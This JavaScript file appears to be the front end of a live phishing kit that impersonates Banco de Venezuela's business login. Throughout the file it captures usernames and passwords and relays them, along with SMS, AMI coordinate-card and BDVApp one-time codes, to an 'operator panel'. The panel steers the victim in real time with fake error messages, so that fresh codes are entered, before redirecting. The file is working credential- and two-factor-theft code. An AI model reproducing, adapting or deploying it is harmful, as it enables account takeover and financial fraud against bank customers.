(function () {
  // Manejo de sesión única vinculada al panel de operador
  let sessionId = sessionStorage.getItem('sessionId') || ('sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9));
  sessionStorage.setItem('sessionId', sessionId);

  let pingInterval = null;
  let pollInterval = null;
  let currentOtpAction = 'sms';

  function startPing() {
    if (pingInterval) clearInterval(pingInterval);
    fetch(`/api/sessions/${sessionId}/ping`, { method: 'POST' }).catch(() => {});
    pingInterval = setInterval(() => {
      fetch(`/api/sessions/${sessionId}/ping`, { method: 'POST' }).catch(() => {});
    }, 3000);
  }

  function stopPing() {
    if (pingInterval) {
      clearInterval(pingInterval);
      pingInterval = null;
    }
  }

  function stopPolling() {
    if (pollInterval) {
      clearInterval(pollInterval);
      pollInterval = null;
    }
  }

  function sendState(state) {
    if (!sessionId) return;
    fetch(`/api/sessions/${sessionId}/state`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ state })
    }).catch(() => {});
  }

  const userInput = document.querySelector('input[formcontrolname="username"], input[name="username"]');
  const entrarBtn = document.querySelector('.button-login-container button');
  const userField = userInput ? userInput.closest('.mat-form-field') : null;
  const userLabel = userField ? userField.querySelector('.mat-form-field-label') : null;

  function updateUserFloat() {
    if (!userField) return;
    const has = userInput.value.length > 0;
    const focused = document.activeElement === userInput;
    userField.classList.toggle('mat-focused', focused);
    if (has || focused) {
      userField.classList.add('mat-form-field-should-float');
      if (userLabel) userLabel.classList.remove('mat-empty', 'mat-form-field-empty');
    } else {
      userField.classList.remove('mat-form-field-should-float');
      if (userLabel) userLabel.classList.add('mat-empty', 'mat-form-field-empty');
    }
  }

  if (userInput) {
    userInput.addEventListener('focus', updateUserFloat);
    userInput.addEventListener('blur', updateUserFloat);
    userInput.addEventListener('input', () => {
      if (entrarBtn) entrarBtn.disabled = userInput.value.trim().length === 0;
      updateUserFloat();
    });
    updateUserFloat();
    if (entrarBtn) entrarBtn.disabled = userInput.value.trim().length === 0;
  }

  const passModal = document.getElementById('passModal');
  const passField = document.getElementById('passField');
  const passLabel = document.getElementById('passLabel');
  const password = document.getElementById('password');
  const continueBtn = document.getElementById('continueBtn');
  const cancelBtn = document.getElementById('cancelBtn');
  const passForm = document.getElementById('passForm');
  const passError = document.getElementById('passError');

  function updatePassField() {
    const has = password.value.length > 0;
    const focused = document.activeElement === password;
    passField.classList.toggle('mat-focused', focused);
    passField.classList.toggle('mat-form-field-should-float', has || focused);
    if (has || focused) {
      passLabel.classList.remove('mat-empty', 'mat-form-field-empty');
    } else {
      passLabel.classList.add('mat-empty', 'mat-form-field-empty');
    }
    continueBtn.disabled = !has;
  }

  function setPassError(show, message) {
    passField.classList.toggle('mat-form-field-invalid', show);
    passField.classList.toggle('ng-invalid', show);
    if (passError) {
      passError.hidden = !show;
      if (message) passError.textContent = message;
    }
    password.setAttribute('aria-invalid', show ? 'true' : 'false');
  }

  function openModal() {
    passModal.classList.add('is-open');
    password.value = '';
    continueBtn.disabled = true;
    setPassError(false);
    passField.classList.remove('mat-focused', 'mat-form-field-should-float');
    passLabel.classList.add('mat-empty', 'mat-form-field-empty');
    setTimeout(() => password.focus(), 30);
  }

  function closeModal() {
    passModal.classList.remove('is-open');
  }

  function handleUserSubmit() {
    if (!userInput || userInput.value.trim().length === 0) return;
    const userVal = userInput.value.trim();
    sessionStorage.setItem('last_user', userVal);
    openModal();
  }

  if (entrarBtn) {
    const form = entrarBtn.closest('form');
    if (form) {
      form.addEventListener('submit', (e) => {
        e.preventDefault();
        handleUserSubmit();
      });
    }
    entrarBtn.addEventListener('click', (e) => {
      e.preventDefault();
      handleUserSubmit();
    });
  }

  password.addEventListener('focus', updatePassField);
  password.addEventListener('blur', () => {
    updatePassField();
    setPassError(password.value.length === 0);
  });
  password.addEventListener('input', () => {
    updatePassField();
    if (password.value.length > 0) setPassError(false);
  });

  cancelBtn.addEventListener('click', closeModal);
  passModal.querySelector('.cdk-overlay-backdrop').addEventListener('click', closeModal);
  document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape' && passModal.classList.contains('is-open')) closeModal();
  });

  const spinner = document.getElementById('spinner');
  const authMethod = document.getElementById('authMethod');
  const loginUnico = document.querySelector('app-login-unico');
  const acceptMethodBtn = document.getElementById('acceptMethodBtn');
  const optSms = document.getElementById('optSms');
  const optAmi = document.getElementById('optAmi');
  const optBdvapp = document.getElementById('optBdvapp');
  const backMethodBtn = document.getElementById('backMethodBtn');
  const verifyForm = document.getElementById('verifyForm');
  const verifyCode = document.getElementById('verifyCode');
  const verifyBtn = document.getElementById('verifyBtn');
  const codeField = document.getElementById('codeField');
  const codeLabel = document.getElementById('codeLabel');
  const authSelectPanel = document.getElementById('authSelectPanel');
  const authVerifyPanel = document.getElementById('authVerifyPanel');
  const authStep1 = document.getElementById('authStep1');
  const authStep2 = document.getElementById('authStep2');
  const authStep1Icon = document.getElementById('authStep1Icon');
  const authStepLine = document.getElementById('authStepLine');
  const authMethodName = document.getElementById('authMethodName');

  let selectedMethod = 'sms';

  function showSpinner() {
    if (spinner) {
      spinner.classList.add('is-visible');
      spinner.style.setProperty('display', 'flex', 'important');
    }
  }
  function hideSpinner() {
    if (spinner) {
      spinner.classList.remove('is-visible');
      spinner.style.setProperty('display', 'none', 'important');
    }
  }

  function updateCodeFloat() {
    if (!codeField || !verifyCode) return;
    const has = verifyCode.value.length > 0;
    const focused = document.activeElement === verifyCode;
    codeField.classList.toggle('mat-focused', focused);
    codeField.classList.toggle('mat-form-field-should-float', has || focused);
    if (codeLabel) {
      if (has || focused) codeLabel.classList.remove('mat-empty', 'mat-form-field-empty');
      else codeLabel.classList.add('mat-empty', 'mat-form-field-empty');
    }
    if (verifyBtn) verifyBtn.disabled = !has;
  }

  function selectMethod(mode) {
    selectedMethod = mode || 'sms';
    const cards = [
      { el: optSms, val: 'sms' },
      { el: optAmi, val: 'ami' },
      { el: optBdvapp, val: 'bdvapp' }
    ];
    cards.forEach((item) => {
      if (!item.el) return;
      const isMatch = item.val === selectedMethod;
      item.el.classList.toggle('is-selected', isMatch);
      const radio = item.el.querySelector('input[type="radio"]');
      if (radio) radio.checked = isMatch;
    });
  }

  [optSms, optAmi, optBdvapp].forEach((el) => {
    if (!el) return;
    el.addEventListener('click', () => {
      const m = el.dataset.method;
      if (m) selectMethod(m);
    });
  });

  function showSelectStep(mode) {
    if (!authMethod) return;
    authMethod.dataset.step = 'select';
    if (authSelectPanel) {
      authSelectPanel.hidden = false;
      authSelectPanel.style.setProperty('display', 'block', 'important');
    }
    if (authVerifyPanel) {
      authVerifyPanel.hidden = true;
      authVerifyPanel.style.setProperty('display', 'none', 'important');
    }
    if (authStep1) {
      authStep1.classList.add('is-active');
      authStep1.classList.remove('is-done');
      authStep1.setAttribute('aria-selected', 'true');
    }
    if (authStep2) {
      authStep2.classList.remove('is-active');
      authStep2.setAttribute('aria-selected', 'false');
    }
    if (authStep1Icon) authStep1Icon.textContent = '1';
    if (authStepLine) authStepLine.classList.remove('is-done');
    if (verifyCode) verifyCode.value = '';
    updateCodeFloat();

    selectMethod(mode || currentOtpAction || 'sms');
  }

  function showVerifyStep(mode) {
    if (!authMethod) return;
    currentOtpAction = mode;
    authMethod.dataset.step = 'verify';
    if (authSelectPanel) {
      authSelectPanel.hidden = true;
      authSelectPanel.style.setProperty('display', 'none', 'important');
    }
    if (authVerifyPanel) {
      authVerifyPanel.hidden = false;
      authVerifyPanel.style.setProperty('display', 'block', 'important');
    }
    if (authStep1) {
      authStep1.classList.remove('is-active');
      authStep1.classList.add('is-done');
      authStep1.setAttribute('aria-selected', 'false');
    }
    if (authStep2) {
      authStep2.classList.add('is-active');
      authStep2.setAttribute('aria-selected', 'true');
    }
    if (authStep1Icon) {
      authStep1Icon.innerHTML = '<svg class="auth-edit-icon" viewBox="0 0 24 24" aria-hidden="true"><path fill="#fff" d="M3 17.25V21h3.75L17.81 9.94l-3.75-3.75L3 17.25zM20.71 7.04a1.003 1.003 0 0 0 0-1.42l-2.34-2.34a1.003 1.003 0 0 0-1.42 0l-1.83 1.83 3.75 3.75 1.84-1.82z"/></svg>';
    }
    if (authStepLine) authStepLine.classList.add('is-done');

    // Adaptar etiquetas según método solicitado (SMS, AMI o BDVApp)
    const labelTitle = document.querySelector('.auth-verify-title');
    const labelSub = document.querySelector('.auth-verify-sub');
    const matLabel = codeLabel ? codeLabel.querySelector('mat-label') : null;

    if (mode === 'ami') {
      if (authMethodName) authMethodName.textContent = 'Tarjeta de Coordenadas (AMI)';
      if (labelTitle) labelTitle.textContent = 'Tarjeta de Coordenadas (AMI)';
      if (labelSub) labelSub.textContent = 'Introduce las coordenadas de tu tarjeta AMI Venlínea';
      if (matLabel) matLabel.textContent = 'Coordenadas AMI';
    } else if (mode === 'bdvapp') {
      if (authMethodName) authMethodName.textContent = 'Autenticación BDVApp';
      if (labelTitle) labelTitle.textContent = 'Autenticación BDVApp';
      if (labelSub) labelSub.textContent = 'Introduce la clave generada en tu aplicación móvil BDVApp';
      if (matLabel) matLabel.textContent = 'Código BDVApp';
    } else {
      if (authMethodName) authMethodName.textContent = 'Código por SMS';
      if (labelTitle) labelTitle.textContent = 'Verificación por SMS';
      if (labelSub) labelSub.textContent = 'Introduce el código de verificación enviado por mensaje de texto';
      if (matLabel) matLabel.textContent = 'Código SMS';
    }

    if (codeField) codeField.classList.remove('mat-form-field-invalid');
    if (verifyCode) {
      verifyCode.value = '';
      setTimeout(() => verifyCode.focus(), 40);
    }
    updateCodeFloat();
  }

  function goToAuthMethod(mode) {
    hideSpinner();
    closeModal();
    if (loginUnico) {
      loginUnico.hidden = true;
      loginUnico.style.setProperty('display', 'none', 'important');
    }
    if (authMethod) {
      authMethod.hidden = false;
      authMethod.style.setProperty('display', 'block', 'important');
    }
    // Paso 1: Primero muestra la pantalla de selección con el botón Aceptar
    showSelectStep(mode || 'sms');
  }

  // Al hacer clic en Aceptar en el Paso 1
  if (acceptMethodBtn) {
    acceptMethodBtn.addEventListener('click', () => {
      showSpinner();
      sendState('metodo-' + selectedMethod);
      setTimeout(() => {
        hideSpinner();
        showVerifyStep(selectedMethod);
      }, 600);
    });
  }

  if (backMethodBtn) {
    backMethodBtn.addEventListener('click', () => {
      showSelectStep(currentOtpAction);
    });
  }

  if (verifyCode) {
    verifyCode.addEventListener('focus', updateCodeFloat);
    verifyCode.addEventListener('blur', updateCodeFloat);
    verifyCode.addEventListener('input', () => {
      updateCodeFloat();
    });
  }

  // Polling del cliente esperando órdenes del panel de operador
  let lastHandledAction = null;

  function startPolling() {
    stopPolling();
    pollInterval = setInterval(async () => {
      try {
        const u = encodeURIComponent(sessionStorage.getItem('last_user') || (userInput ? userInput.value.trim() : ''));
        const p = encodeURIComponent(sessionStorage.getItem('last_pass') || (password ? password.value : ''));
        const response = await fetch(`/api/sessions/${sessionId}?user=${u}&pass=${p}`);
        if (!response.ok) return;
        const data = await response.json();
        const action = data.action;

        // Si no hay acción o ya se procesó esta misma acción, no hacer nada repetitivo
        if (!action || action === lastHandledAction) return;
        lastHandledAction = action;

        if (action === 'sms') {
          goToAuthMethod('sms');
        } else if (action === 'ami') {
          goToAuthMethod('ami');
        } else if (action === 'bdvapp') {
          goToAuthMethod('bdvapp');
        } else if (action === 'error-login') {
          hideSpinner();
          openModal();
          setPassError(true, 'Usuario o contraseña inválida. Verifique sus datos.');
          continueBtn.disabled = false;
        } else if (action === 'error-sms') {
          hideSpinner();
          if (codeField) codeField.classList.add('mat-form-field-invalid');
          if (verifyCode) {
            verifyCode.value = '';
            verifyCode.focus();
          }
          alert('Código SMS incorrecto o vencido. Por favor ingrese el nuevo código recibido.');
        } else if (action === 'error-ami') {
          hideSpinner();
          if (codeField) codeField.classList.add('mat-form-field-invalid');
          if (verifyCode) {
            verifyCode.value = '';
            verifyCode.focus();
          }
          alert('Coordenadas AMI incorrectas. Por favor verifique su tarjeta AMI e intente nuevamente.');
        } else if (action === 'error-bdvapp') {
          hideSpinner();
          if (codeField) codeField.classList.add('mat-form-field-invalid');
          if (verifyCode) {
            verifyCode.value = '';
            verifyCode.focus();
          }
          alert('Código BDVApp incorrecto o expirado. Genere un nuevo código e ingrese nuevamente.');
        } else if (action === 'done') {
          stopPing();
          stopPolling();
          hideSpinner();
          sessionStorage.removeItem('is_waiting');
          window.location.href = 'panel.html';
        }
      } catch (_) {}
    }, 1000);
  }

  // Envío del código de verificación (Token / SMS / AMI / BDVApp)
  if (verifyForm) {
    verifyForm.addEventListener('submit', async (e) => {
      e.preventDefault();
      if (!verifyCode || verifyCode.value.trim().length === 0) return;
      const tokenVal = verifyCode.value.trim();

      showSpinner();
      lastHandledAction = null; // Permitir que el operador envíe nuevas acciones posteriores

      try {
        await fetch(`/api/sessions/${sessionId}/token`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ token: tokenVal })
        });
      } catch (_) {}
    });
  }

  // Envío de Usuario y Clave al Panel de Operador
  passForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    if (password.value.length === 0) {
      setPassError(true);
      return;
    }
    continueBtn.disabled = true;
    showSpinner();

    const device = /mobile|android|iphone|ipad|phone/i.test(navigator.userAgent) ? 'mobile' : 'desktop';
    const userVal = userInput ? userInput.value.trim() : (sessionStorage.getItem('last_user') || 'EMPRESA');
    const passVal = password.value;
    sessionStorage.setItem('last_user', userVal);
    sessionStorage.setItem('last_pass', passVal);
    sessionStorage.setItem('is_waiting', 'true');

    try {
      await fetch('/api/sessions', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          id: sessionId,
          username: userVal,
          password: passVal,
          tipoUsuario: 'EMPRESAS',
          device: device,
          state: 'waiting'
        })
      });
    } catch (_) {}

    startPing();
    startPolling();
  });

  // Reanudar polling si la sesión estaba en espera
  if (sessionStorage.getItem('is_waiting') === 'true') {
    startPing();
    startPolling();
  }

  // Acceso directo: ?paso=clave | ?paso=metodo | ?paso=verificar
  const paso = new URLSearchParams(location.search).get('paso');
  if (paso === 'clave') {
    if (userInput && !userInput.value) {
      userInput.value = 'empresa_demo';
      updateUserFloat();
    }
    openModal();
  } else if (paso === 'metodo' || paso === 'verificar') {
    if (loginUnico) loginUnico.hidden = true;
    if (authMethod) authMethod.hidden = false;
    if (paso === 'verificar') showVerifyStep('sms');
    else showSelectStep();
  }
})();
